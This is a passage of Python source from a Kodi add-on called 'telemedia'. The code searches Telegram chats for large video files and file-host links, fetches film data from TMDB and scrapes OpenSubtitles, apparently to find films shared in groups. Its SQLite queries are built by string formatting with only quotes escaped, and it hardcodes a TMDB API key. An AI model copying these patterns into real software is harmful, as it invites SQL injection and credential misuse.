    query=query.replace('%20',' ').replace('%27',"'").replace('%3a',":")
    if query not in all_pre_search and manual:
        dbcur.execute("INSERT INTO search Values ('%s','%s');" %  (query.replace("'","%27"),' '))
        dbcon.commit()
    dbcur.close()
    dbcon.close()
    num=random.randint(1,1001)
    all_links=[]
    filter_size=int(Addon.getSetting("filter_size"))*1024*1024
    logging.warning(filter_size)
    filter_sizelimit=int(Addon.getSetting("filter_sizelimit"))*1024*1024
    if type=='all':
        data={'type':'td_send',
             'info':json.dumps({'@type': 'searchMessages', 'query': query,'offset_message_id':last_id,'offset_chat_id':last_id_msg,'limit':100, '@extra': num})
             }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
        
        counter_ph=0
        for items in event['messages']:  
            #logging.warning(items)
            
            if 'document' in items['content']:
                name=items['content']['document']['file_name']
                if '.mkv' not in name and '.mp4' not in name and '.avi' not in name:
                    continue
                size=items['content']['document']['document']['size']
                if size<filter_size:
                    continue
                if size>filter_sizelimit:
                    continue
                f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                
                q,loc=get_q(name)
                link_data={}
                link_data['id']=str(items['content']['document']['document']['id'])
                link_data['m_id']=items['id']
                link_data['c_id']=items['chat_id']
                f_lk=json.dumps(link_data)
                all_links.append((name, f_lk,3,q,loc, icon_pre,fan_pre,f_size2,no_subs,tmdb,season,episode,original_title))
                
                #addLink( name, str(items['content']['document']['document']['id']),3,False, icon_pre,fan_pre,f_size2,data=data,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            if 'video' in items['content']:
                    name=items['content']['video']['file_name']
                    
                    size=items['content']['video']['video']['size']
                    if size<filter_size:
                        continue
                    if size>filter_sizelimit:
                        continue
                    f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                    logging.warning('items')
                    q,loc=get_q(name)
                    link_data={}
                    link_data['id']=str(items['content']['video']['video']['id'])
                    link_data['m_id']=items['id']
                    link_data['c_id']=items['chat_id']
                    f_lk=json.dumps(link_data)
                    all_links.append(( name, f_lk,3,q,loc, icon_pre,fan_pre,f_size2,no_subs,tmdb,season,episode,original_title))
                    #addLink( name, str(items['content']['video']['video']['id']),3,False, icon_pre,fan_pre,f_size2,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            if 'caption' in items['content']:
                    txt_lines=items['content']['caption']['text'].split('\n')
                    all_l=[]
                    name=txt_lines[0]
                    rem_lines=[]
                    for lines in txt_lines:
                        if 'upfile' not in lines and 'drive.google' not in lines:
                          rem_lines.append(lines)
                          continue
                        
                            
                        all_l.append(lines)
                    if len(all_l)==0:
                        continue
                    icon=icon_pre
                    fan=fan_pre
                    if 'photo' in items['content']['caption']:
                        counter_ph+=1
                        icon_id=items['content']['photo']['sizes'][0]['photo']['id']
                        f_name=items['content']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(icons_path,f_name)
                        if os.path.exists(mv_name):
                            icon=mv_name
                        else:
                           icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                        
                        counter_ph+=1
                        loc=items['content']['photo']['sizes']
                        icon_id=items['content']['photo']['sizes'][len(loc)-1]['photo']['id']
                        f_name=items['content']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(fan_path,f_name)
                        if os.path.exists(mv_name):
                            fan=mv_name
                        else:
                           fan=download_photo(icon_id,counter_ph,f_name,mv_name)
                           
                    q,loc=get_q(txt_lines[0])
                    all_links.append(('[COLOR lightgreen]'+ txt_lines[0]+'[/COLOR]' , '$$$'.join(all_l),9,q,loc, icon,fan,('\n'.join(rem_lines)).replace('\n\n','\n'),no_subs,tmdb,season,episode,original_title))
                    #addLink( '[COLOR lightgreen]'+ txt_lines[0]+'[/COLOR]' , '$$$'.join(all_l),9,False, icon,fan,('\n'.join(rem_lines)).replace('\n\n','\n'),no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            elif 'web_page' in items['content']:
                name=items['content']['web_page']['title']
                link=items['content']['web_page']['url']
                plot=items['content']['web_page']['description']
                if 'upfile' not in link and 'drive.google' not in link:
                      
                      continue
                icon=icon_pre
                fan=fan_pre
                if 'photo' in items['content']['web_page']:
                    counter_ph+=1
                    icon_id=items['content']['web_page']['photo']['sizes'][0]['photo']['id']
                    f_name=items['content']['web_page']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                    mv_name=os.path.join(icons_path,f_name)
                    if os.path.exists(mv_name):
                        icon=mv_name
                    else:
                       icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                    
                    counter_ph+=1
                    loc=items['content']['web_page']['photo']['sizes']
                    icon_id=items['content']['web_page']['photo']['sizes'][len(loc)-1]['photo']['id']
                    f_name=items['content']['web_page']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                    mv_name=os.path.join(fan_path,f_name)
                    if os.path.exists(mv_name):
                        fan=mv_name
                    else:
                       fan=download_photo(icon_id,counter_ph,f_name,mv_name)
              
                q,loc=get_q(name)
                
                all_links.append(('[COLOR lightgreen]'+ name+'[/COLOR]', link,9,q,loc, icon,fan,plot.replace('\n\n','\n'),no_subs,tmdb,season,episode,original_title))
                #addLink( '[COLOR lightgreen]'+ name+'[/COLOR]', link,9,False, icon,fan,plot.replace('\n\n','\n'),no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            f_id=items['chat_id']
    if dont_return:
        all_links=sorted(all_links, key=lambda x: x[4], reverse=False)
        filter_dup=Addon.getSetting("dup_links")=='true'
        all_t_links=[]
        for  name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title in all_links:
            
            if name not in all_t_links or filter_dup==False:
            
                if '5.1' in name:
                    sound='[COLOR red]5.1[/COLOR]'
                elif '6CH' in name:
                    sound='[COLOR red]5.1[/COLOR]'
                elif 'מדובב' in name:
                    sound='[COLOR yellow]מדובב[/COLOR]'
                elif 'ת.מ' in name:
                    sound='[COLOR yellow]תרגום מובנה[/COLOR]'

                else:
                    sound=''
                if 'BluRay' in name:
                    sou='[COLOR blue]BluRay[/COLOR]'
                elif 'HDCam' in name:
                    sou='[COLOR yellow]איכות מצלמה[/COLOR]'
                else:
                    sou=''
                all_t_links.append(name)
                addLink( name, link,mode,False, icon,fan,plot,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
                menu.append([name,'', '',q,sound,sou,'',''])
        try:
            last_id=str(items['id'])+'$$$'+str(f_id)
            
        except:
            #xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia', 'No result for:'+query))
            pass
            
    menu2 = ContextMenu_new2('plugin.video.telemedia', menu,iconimage,fanart,description)
    menu2.doModal()
    stopnext = False
    del menu2
    ret=selected_index

    if ret!=-1:
          # name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot
           name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title=all_links[ret]
           play(name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot,None,dd,nextup='true')
           # sys.exit()
    return all_links
    #addDir3('[COLOR yellow]'+'Next Page'+'[/COLOR]',str(id),6,'https://www.5thtackle.com/wp-content/uploads/2017/04/next-page.jpg','https://www.mcgill.ca/continuingstudies/files/continuingstudies/next-page-magazine.png',query,data=type,last_id=last_id)
    
def searchallinone(tmdb,type,last_id_pre,search_entered_pre,icon_pre,fan_pre,season,episode,no_subs=0,original_title='',heb_name='',dont_return=True,manual=True):
    import random
    try:
        from sqlite3 import dbapi2 as database
    except:
        from pysqlite2 import dbapi2 as database
    cacheFile=os.path.join(user_dataDir,'database.db')
    dbcon = database.connect(cacheFile)
    dbcur = dbcon.cursor()
    dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""free TEXT);" % 'search')
    dbcon.commit()
        
    dbcur.execute("SELECT * FROM search")
    match_search = dbcur.fetchall()
    all_pre_search=[]
    menu=[]
    for nm,fr in match_search:
        all_pre_search.append(nm)
    last_id=last_id_pre.split('$$$')[0]
    last_id_msg=last_id_pre.split('$$$')[1]
   
    
    if search_entered_pre=='Search All':
        search_entered=''
        
        #Enter Search
        keyboard = xbmc.Keyboard(search_entered, Addon.getLocalizedString(32025))
        keyboard.doModal()
        if keyboard.isConfirmed():
                query = keyboard.getText()
        else:
            return 0
    else:
        query=search_entered_pre
    query=query.replace('%20',' ').replace('%27',"'").replace('%3a',":")
    
    
    
    
    
    
    
    
    all_d=[]
    from resources.modules.tmdb import get_movies
    # search_entered=''
    # keyboard = xbmc.Keyboard(search_entered, 'הכנס מילות חיפוש כאן')
    # keyboard.doModal()
    # if keyboard.isConfirmed() :
           # query = keyboard.getText()
           # if query=='':
            # sys.exit()
            

    addNolink( '[COLOR blue][I]---סרטים---[/I][/COLOR]', id,27,False,fan=' ', iconimage=telemaia_icon,plot=' ')
    get_movies('http://api.themoviedb.org/3/search/movie?api_key=34142515d9d23817496eeb4ff1d223d0&query={0}&language={1}&append_to_response=origin_country&page=1'.format(query,lang),global_s=True)
    
    addNolink( '[COLOR blue][I]---סדרות---[/I][/COLOR]', id,27,False,fan=' ', iconimage=telemaia_icon,plot=' ')
    get_movies('http://api.themoviedb.org/3/search/tv?api_key=34142515d9d23817496eeb4ff1d223d0&query={0}&language={1}&page=1'.format(query,lang),global_s=True)
    
    
    
    
    
    
    
    
    
    
    # search_entered=''
    # #'Enter Search'
    # keyboard = xbmc.Keyboard(search_entered, Addon.getLocalizedString(32025))
    # keyboard.doModal()
    # if keyboard.isConfirmed():
            # query = keyboard.getText()
    # else:
        # return 0
    num=random.randint(0,60000)
    data={'type':'td_send',
         'info':json.dumps({'@type': 'searchPublicChats', 'query': query.decode('utf-8'), '@extra': num})
         }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    
    dp = xbmcgui.DialogProgress()
    dp.create('Please Wait...','Adding Groups', '','')
    dp.update(0, 'Please Wait...','Adding Groups', '' )

    logging.warning(json.dumps(event))
    counter=0
    counter_ph=10000
    zzz=0
    for items in event['chat_ids']:
        num=random.randint(0,60000)
        data={'type':'td_send',
                 'info':json.dumps({'@type': 'getChat','chat_id':items, '@extra':num})
                 }
        event_in=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        logging.warning(json.dumps(event_in))
        if dp.iscanceled():
                      dp.close()
                     
                      break
        j_enent=(event_in)
        
        dp.update(int(((zzz* 100.0)/(len(event['chat_ids']))) ), 'Please Wait...','Adding Groups', j_enent['@type'].encode('utf8') )
        if j_enent['@type']=='chat' and len(j_enent['title'])>1:
            
            icon_id=''
            fan_id=''
            fanart=''
            icon=''
            name=j_enent['title']
         
            color='white'
            if 'is_channel' in j_enent['type']:
                if j_enent['type']['is_channel']==False:
                    
                    genere='Chat'
                    color='lightblue'
                else:
                    genere='Channel'
                    color='khaki'
            else:
                 genere=j_enent['type']['@type']
                 color='lightgreen'
            if 'last_message' in j_enent:
                plot=name.encode('utf8')
                pre=j_enent['last_message']['content']
           
                if 'caption' in pre:
                    plot=j_enent['last_message']['content']['caption']['text'].encode('utf8')
                elif 'text' in pre:
                    if 'text' in pre['text']:
                        plot=j_enent['last_message']['content']['text']['text'].encode('utf8')
                
                    
            else:
                plot=name.encode('utf8')
            dp.update(int(((zzz* 100.0)/(len(event['chat_ids']))) ), 'Please Wait...','Adding Groups', name.encode('utf8') )
            zzz+=1
         
            if 'photo' in j_enent:
               
               if 'small' in j_enent['photo']:
                 counter_ph+=1
                 icon_id=j_enent['photo']['small']['id']
                 f_name=str(j_enent['id'])+'_small.jpg'
                 mv_name=os.path.join(logo_path,f_name)
                 if os.path.exists(mv_name):
                    icon=mv_name
                 else:
                    icon=download_photo(icon_id,counter_ph,f_name,mv_name)
               if 'big' in j_enent['photo']:
                 counter_ph+=1
                 fan_id=j_enent['photo']['big']['id']
                 f_name=str(j_enent['id'])+'_big.jpg'
                 mv_name=os.path.join(logo_path,f_name)
                 if os.path.exists(mv_name):
                    fanart=mv_name
                 else:
                    fanart=download_photo(fan_id,counter_ph,f_name,mv_name)
            
            
            aa=addDir3('[COLOR %s]'%color+name.encode('utf8')+'[/COLOR]',str(items),2,icon,fanart,plot+'\nfrom_plot',generes=genere,data='0',last_id='0$$$0$$$0$$$0',image_master=icon+'$$$'+fanart,join_menu=True)
            all_d.append(aa)
        
        counter+=1
    if len(all_d)>0:
         
        addNolink( '[COLOR lightblue][I]%s[/I][/COLOR]'%'---קבוצות---', 'www',99,False,iconimage=telemaia_icon,fan='')
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
        # dp.close()
    
    
    addNolink( '[COLOR lightblue][I]%s[/I][/COLOR]'%'---כללי---', 'www',99,False,iconimage=telemaia_icon,fan='')
    
    

    
    if query not in all_pre_search and manual:
        dbcur.execute("INSERT INTO search Values ('%s','%s');" %  (query.replace("'","%27"),' '))
        dbcon.commit()
    dbcur.close()
    dbcon.close()
    num=random.randint(1,1001)
    all_links=[]
    filter_size=int(Addon.getSetting("filter_size"))*1024*1024
    logging.warning(filter_size)
    filter_sizelimit=int(Addon.getSetting("filter_sizelimit"))*1024*1024
    if type=='all':
        data={'type':'td_send',
             'info':json.dumps({'@type': 'searchMessages', 'query': query,'offset_message_id':last_id,'offset_chat_id':last_id_msg,'limit':100, '@extra': num})
             }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
        
        counter_ph=0
        for items in event['messages']:  
            #logging.warning(items)
            
            if 'document' in items['content']:
                name=items['content']['document']['file_name']
                if '.mkv' not in name and '.mp4' not in name and '.avi' not in name:
                    continue
                size=items['content']['document']['document']['size']
                if size<filter_size:
                    continue
                if size>filter_sizelimit:
                    continue
                f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                
                q,loc=get_q(name)
                link_data={}
                link_data['id']=str(items['content']['document']['document']['id'])
                link_data['m_id']=items['id']
                link_data['c_id']=items['chat_id']
                f_lk=json.dumps(link_data)
                all_links.append((name, f_lk,3,q,loc, icon_pre,fan_pre,f_size2,no_subs,tmdb,season,episode,original_title))
                
                #addLink( name, str(items['content']['document']['document']['id']),3,False, icon_pre,fan_pre,f_size2,data=data,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            if 'video' in items['content']:
                    name=items['content']['video']['file_name']
                    
                    size=items['content']['video']['video']['size']
                    if size<filter_size:
                        continue
                    if size>filter_sizelimit:
                        continue
                    f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                    logging.warning('items')
                    q,loc=get_q(name)
                    link_data={}
                    link_data['id']=str(items['content']['video']['video']['id'])
                    link_data['m_id']=items['id']
                    link_data['c_id']=items['chat_id']
                    f_lk=json.dumps(link_data)
                    all_links.append(( name, f_lk,3,q,loc, icon_pre,fan_pre,f_size2,no_subs,tmdb,season,episode,original_title))
                    #addLink( name, str(items['content']['video']['video']['id']),3,False, icon_pre,fan_pre,f_size2,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            if 'caption' in items['content']:
                    txt_lines=items['content']['caption']['text'].split('\n')
                    all_l=[]
                    name=txt_lines[0]
                    rem_lines=[]
                    for lines in txt_lines:
                        if 'upfile' not in lines and 'drive.google' not in lines:
                          rem_lines.append(lines)
                          continue
                        
                            
                        all_l.append(lines)
                    if len(all_l)==0:
                        continue
                    icon=icon_pre
                    fan=fan_pre
                    if 'photo' in items['content']['caption']:
                        counter_ph+=1
                        icon_id=items['content']['photo']['sizes'][0]['photo']['id']
                        f_name=items['content']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(icons_path,f_name)
                        if os.path.exists(mv_name):
                            icon=mv_name
                        else:
                           icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                        
                        counter_ph+=1
                        loc=items['content']['photo']['sizes']
                        icon_id=items['content']['photo']['sizes'][len(loc)-1]['photo']['id']
                        f_name=items['content']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(fan_path,f_name)
                        if os.path.exists(mv_name):
                            fan=mv_name
                        else:
                           fan=download_photo(icon_id,counter_ph,f_name,mv_name)
                           
                    q,loc=get_q(txt_lines[0])
                    all_links.append(('[COLOR lightgreen]'+ txt_lines[0]+'[/COLOR]' , '$$$'.join(all_l),9,q,loc, icon,fan,('\n'.join(rem_lines)).replace('\n\n','\n'),no_subs,tmdb,season,episode,original_title))
                    #addLink( '[COLOR lightgreen]'+ txt_lines[0]+'[/COLOR]' , '$$$'.join(all_l),9,False, icon,fan,('\n'.join(rem_lines)).replace('\n\n','\n'),no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            elif 'web_page' in items['content']:
                name=items['content']['web_page']['title']
                link=items['content']['web_page']['url']
                plot=items['content']['web_page']['description']
                if 'upfile' not in link and 'drive.google' not in link:
                      
                      continue
                icon=icon_pre
                fan=fan_pre
                if 'photo' in items['content']['web_page']:
                    counter_ph+=1
                    icon_id=items['content']['web_page']['photo']['sizes'][0]['photo']['id']
                    f_name=items['content']['web_page']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                    mv_name=os.path.join(icons_path,f_name)
                    if os.path.exists(mv_name):
                        icon=mv_name
                    else:
                       icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                    
                    counter_ph+=1
                    loc=items['content']['web_page']['photo']['sizes']
                    icon_id=items['content']['web_page']['photo']['sizes'][len(loc)-1]['photo']['id']
                    f_name=items['content']['web_page']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                    mv_name=os.path.join(fan_path,f_name)
                    if os.path.exists(mv_name):
                        fan=mv_name
                    else:
                       fan=download_photo(icon_id,counter_ph,f_name,mv_name)
              
                q,loc=get_q(name)
                
                all_links.append(('[COLOR lightgreen]'+ name+'[/COLOR]', link,9,q,loc, icon,fan,plot.replace('\n\n','\n'),no_subs,tmdb,season,episode,original_title))
                #addLink( '[COLOR lightgreen]'+ name+'[/COLOR]', link,9,False, icon,fan,plot.replace('\n\n','\n'),no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            f_id=items['chat_id']
    if dont_return:
        all_links=sorted(all_links, key=lambda x: x[4], reverse=False)
        filter_dup=Addon.getSetting("dup_links")=='true'
        all_t_links=[]
        for  name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title in all_links:
            
            if name not in all_t_links or filter_dup==False:
            
                if '5.1' in name:
                    sound='[COLOR red]5.1[/COLOR]'
                elif '6CH' in name:
                    sound='[COLOR red]5.1[/COLOR]'
                elif 'מדובב' in name:
                    sound='[COLOR yellow]מדובב[/COLOR]'
                elif 'ת.מ' in name:
                    sound='[COLOR yellow]תרגום מובנה[/COLOR]'

                else:
                    sound=''
                if 'BluRay' in name:
                    sou='[COLOR blue]BluRay[/COLOR]'
                elif 'HDCam' in name:
                    sou='[COLOR yellow]איכות מצלמה[/COLOR]'
                else:
                    sou=''
                all_t_links.append(name)
                addLink( name, link,mode,False, icon,fan,plot,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
                menu.append([name,'', '',q,sound,sou,'',''])
        try:
            last_id=str(items['id'])+'$$$'+str(f_id)
            
        except:
            #xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia', 'No result for:'+query))
            pass
            
    # menu2 = ContextMenu_new2('plugin.video.telemedia', menu,iconimage,fanart,description)
    # menu2.doModal()
    # stopnext = False
    # del menu2
    # ret=selected_index

    # if ret!=-1:
          # # name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot
           # name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title=all_links[ret]
           # play(name,link,data,icon,fan,no_subs,tmdb,season,episode,original_title,plot,None,dd,nextup='true')
           # # sys.exit()
    return all_links
    
    
    
    
    
    
    
    
    
    
    
    
def latest_subs(url,new_imdb=False):
    o_url=url
    all_d=[]
    import datetime
    #addNolink('[COLOR aqua][B][I]סרוק סרטים לספריית קודי[/I][/B][/COLOR]','www',135,False,iconimage='https://www.thesun.co.uk/wp-content/uploads/2017/04/dd-composite-kodi.jpg?strip=all&w=750',fanart='http://i.imgur.com/9hyJ8Nq.jpg')
    now = datetime.datetime.now()
    selected_year=int(now.year)-1
    modein='1'
    if url=='years':
        all_years=['כל הכתוביות משנה ... עד היום']
        
    
        for year in range(now.year,1970,-1):
             all_years.append(str(year))
        ret=xbmcgui.Dialog().select("בחר שנה", all_years)
        selected_year_pre=''
        modein='1'
        if ret!=-1:
          if ret==0:
            keyboard = xbmc.Keyboard(selected_year_pre, 'הכנס שנה')
            
            keyboard.doModal()
            if keyboard.isConfirmed():
                selected_year_pre = keyboard.getText()
                if selected_year_pre.isdigit():
                    selected_year=int(selected_year_pre)
                    modein='5'
          else:
          
            selected_year=int(all_years[ret])
        else:
         sys.exit()
    try:
        from sqlite3 import dbapi2 as database
    except:
        from pysqlite2 import dbapi2 as database
    logging.warning('last')
    dbcon2 = database.connect(cacheFile2)
    dbcur2 = dbcon2.cursor()
    dbcur2.execute("CREATE TABLE IF NOT EXISTS %s ( ""new_name TEXT,""url TEXT,""mode TEXT,""icon TEXT,""fan TEXT,""plot TEXT,""year TEXT,""original_name TEXT,""id TEXT,""rating TEXT,""new_name2 TEXT,""year2 TEXT,""genere TEXT,""trailer TEXT,""imdb TEXT);"% 'latestsubs')
    
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Host': 'www.dvdsreleasedates.com',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
    }
    url_g=domain_s+'api.themoviedb.org/3/genre/movie/list?api_key=34142515d9d23817496eeb4ff1d223d0&language=he'
    html_g=html_g_movie
    if 'opensubtitles.org' not in url:
      
      x='https://www.opensubtitles.org/en/search/sublanguageid-heb/searchonlymovies-on/movieyearsign-%s/movieyear-%s/sort-5/asc-0'%(modein,str(selected_year))
      
    else:
      x=url
    headers = {
                                
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    html=requests.get(x,headers=headers).content
    regex='http://www.imdb.com/title/(.+?)/'
    match=re.compile(regex).findall(html)
    all_imdb=[]
    dbcur2.execute("SELECT  * FROM latestsubs")
    
    match2 = dbcur2.fetchall()
    all_db_imdb=[]
    
    for new_name,url,mode,icon,fan,plot,year,original_name,id,rating,new_name,year,genere,trailer,imdb in match2:
        all_db_imdb.append(imdb)
    count=0
    for imdb in match:
       if imdb not in all_db_imdb:
         count+=1
    if count>10 and not new_imdb:
       xbmc.executebuiltin((u'Notification(%s,%s)' % ('Telemedia', 'אנא המתן סורק סרטים... '+str(count) )).encode('utf-8'))
    whats_new=[]
    whats_new_images=[]
    fav_search_f=Addon.getSetting("fav_search_f")
    fav_servers_en=Addon.getSetting("fav_servers_en")
    fav_servers=Addon.getSetting("fav_servers")

    google_server= Addon.getSetting("google_server")
    rapid_server=Addon.getSetting("rapid_server")
    direct_server=Addon.getSetting("direct_server")
    heb_server=Addon.getSetting("heb_server")

        
   
              
    for imdb in match:
    
       if imdb not in all_imdb:
        all_imdb.append(imdb)
        if imdb in all_db_imdb:
            dbcur2.execute("SELECT * FROM latestsubs WHERE  imdb='%s'"%imdb)
            match = dbcur2.fetchone()
            new_name,url,mode,icon,fan,plot,year,original_name,id,rating,new_name,year,genere,trailer,imdb=match
            if not new_imdb:
                if  mode==15 and fav_search_f=='true' and fav_servers_en=='true' and (len(fav_servers)>0 or heb_server=='true' or google_server=='true' or rapid_server=='true' or direct_server=='true'):
                
                    fav_status='true'
                else:
                    fav_status='false'
                addDir4(new_name.replace("%27","'"),url,int(mode),icon,fan,plot.replace("%27","'"),data=year,original_title=original_name.replace("%27","'"),id=id,rating=rating,heb_name=new_name.replace("%27","'"),show_original_year=year,isr='0',generes=genere,trailer=trailer,fav_status=fav_status)
                #all_d.append(aa)
        else:
            
                
                
                url=domain_s+'api.themoviedb.org/3/find/%s?api_key=34142515d9d23817496eeb4ff1d223d0&external_source=imdb_id&language=heb'%imdb
                html=requests.get(url).json()
                for data in html['movie_results']:
                 if 'vote_average' in data:
                   rating=data['vote_average']
                 else:
                  rating=0
                 if 'first_air_date' in data:
                   year=str(data['first_air_date'].split("-")[0])
                 else:
                    year=str(data['release_date'].split("-")[0])
                 if data['overview']==None:
                   plot=' '
                 else:
                   plot=data['overview']
                 if 'title' not in data:
                   tv_movie='tv'
                   new_name=data['name']
                 else:
                   tv_movie='movie'
                   new_name=data['title']
                 if 'original_title' in data:
                   original_name=data['original_title']
                   mode=15
                   
                   id=str(data['id'])
                  
                 else:
                   original_name=data['original_name']
                   id=str(data['id'])
                   mode=16
                 if data['poster_path']==None:
                  icon=' '
                 else:
                   icon=data['poster_path']
                 if 'backdrop_path' in data:
                     if data['backdrop_path']==None:
                      fan=' '
                     else:
                      fan=data['backdrop_path']
                 else:
                    fan=html['backdrop_path']
                 if plot==None:
                   plot=' '
                 if 'http' not in fan:
                   fan=domain_s+'image.tmdb.org/t/p/original/'+fan
                 if 'http' not in icon:
                   icon=domain_s+'image.tmdb.org/t/p/original/'+icon
                 genres_list= dict([(i['id'], i['name']) for i in html_g['genres'] \
                        if i['name'] is not None])
                 try:genere = u' / '.join([genres_list[x] for x in data['genre_ids']])
                 except:genere=''

                 trailer = "plugin://plugin.video.telemedia?mode=171&url=www&id=%s&tv_movie=%s" % (id,tv_movie)
                 try:
                    dbcur2.execute("INSERT INTO latestsubs Values ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s','%s','%s','%s','%s');" %  (new_name.replace("'",'%27'),url,mode,icon,fan,plot.replace("'",'%27'),year,original_name.replace("'",'%27'),id,rating,new_name.replace("'",'%27'),year,genere,trailer,imdb))
                 except:
                    pass
                 whats_new.append((new_name,url,icon,fan,plot.replace("'",'%27'),year,original_name,id))
                 if len(whats_new_images)<19:
                    whats_new_images.append(icon)
                 if not new_imdb:
                    if  mode==15 and fav_search_f=='true' and fav_servers_en=='true' and (len(fav_servers)>0 or heb_server=='true' or google_server=='true' or rapid_server=='true' or direct_server=='true'):
                        fav_status='true'
                    else:
                        fav_status='false'
                    addDir4(new_name,url,mode,icon,fan,plot,data=year,original_title=original_name,id=id,rating=rating,heb_name=new_name,show_original_year=year,isr='0',generes=genere,trailer=trailer,fav_status=fav_status)
                    #all_d.append(aa)
    try:
        dbcon2.commit()
    except:
       pass
    regex='offset-(.+?)$'
    match=re.compile(regex).findall(o_url)

    if len(match)==0:
      next='40'
    else:
      next=str(int(match[0])+40)
    if not new_imdb:
        addDir4('[COLOR aqua][I]עמוד הבא[/I][/COLOR]','https://www.opensubtitles.org/en/search/sublanguageid-heb/searchonlymovies-on/movieyearsign-%s/movieyear-%s/sort-5/asc-0/offset-'%(modein,str(selected_year))+next,120,'http://www.stefanovettor.com/wp-content/uploads/2015/09/mySubtitles_logo_256.png','https://youprogrammer.com/wp-content/uploads/2018/01/MOvies-subtitle-download-sites.png','עמוד הבא')
        #all_d.append(aa)
    # if len(whats_new_images)>0 :
        # window = new_movies('כתוביות חדשות',whats_new_images)
        # window.doModal()
        # selection = window.get_selection()
      
        # new_name,url,iconimage,fanart,description,data,original_title,id=whats_new[selection]
    
        
        # del window
        # eng_name=original_title
        # show_original_year=str(data)
        # heb_name=new_name
        # if selection!=-1:
            # xbmc.executebuiltin('ActivateWindow(10025,%s)' % ('%s?name=%s&url=www&mode=4&iconimage=%s&fanart=%s&description=%s&data=%s&original_title=%s&eng_name=%s&show_original_year=%s&heb_name=%s&id=%s')%(sys.argv[0],new_name,iconimage,fanart,urllib.quote_plus(description.encode('utf8')),str(data),original_title,eng_name,str(show_original_year),heb_name,str(id)))
        
    '''
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_SORT_TITLE)
    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_YEAR)

    xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_VIDEO_RATING)
    '''
    #xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
        
def get_cast(url,id,season,episode):
    if url=='movie':
        x='http://api.themoviedb.org/3/movie/%s?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s&append_to_response=credits'%(id,lang)
    else:
        x='http://api.themoviedb.org/3/tv/%s/season/%s/episode/%s?api_key=34142515d9d23817496eeb4ff1d223d0&language=%s&append_to_response=credits'%(id,season,episode,lang)
    html=requests.get(x).json()
   
    aa=[]
    for items in html['credits']['cast']:
        icon=items['profile_path']
        
        if icon==None:
          icon=' '
        else:
          icon='https://'+'image.tmdb.org/t/p/original/'+icon
        fanart=icon
        aa.append(addDir3(items['name']+' [COLOR yellow](%s)[/COLOR]'%items['character'],str(items['id']),169,icon,fanart,items['name']))
    
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),aa,len(aa))
    
def actor_m(url):
    choise=[Addon.getLocalizedString(32099),Addon.getLocalizedString(32124)]
    ret = xbmcgui.Dialog().select(Addon.getLocalizedString(32149), choise)
    if ret!=-1:
        if ret==0:
         tv_mode='tv'
        else:
         tv_mode='movie'
    else:
      sys.exit()

